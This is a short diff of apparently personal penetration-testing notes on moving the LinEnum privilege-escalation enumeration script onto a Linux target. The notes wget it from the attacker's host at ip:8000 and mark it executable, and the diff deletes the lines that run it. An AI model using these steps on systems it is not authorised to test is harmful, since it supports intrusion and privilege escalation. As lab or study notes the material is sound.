@@ -5,15 +5,11 @@
 -- Target:
 	-- wget ip:8000/documents/LinEnum.sh	download file on target
 	-- chmod +x LinEnum.sh 					makes file executable
-	-- ./LinEnum.sh							runs file
-
 
 					Option 2(less privileges)
 -- Attacker:
 	--Copy LinEnum code to Target		      (.sh Extension)
 	--chmod +x LinEnum.sh				   makes file executable
-	--/LinEnum.sh						    runs file
-
 
 					LineEnum Output
 -- kernal information
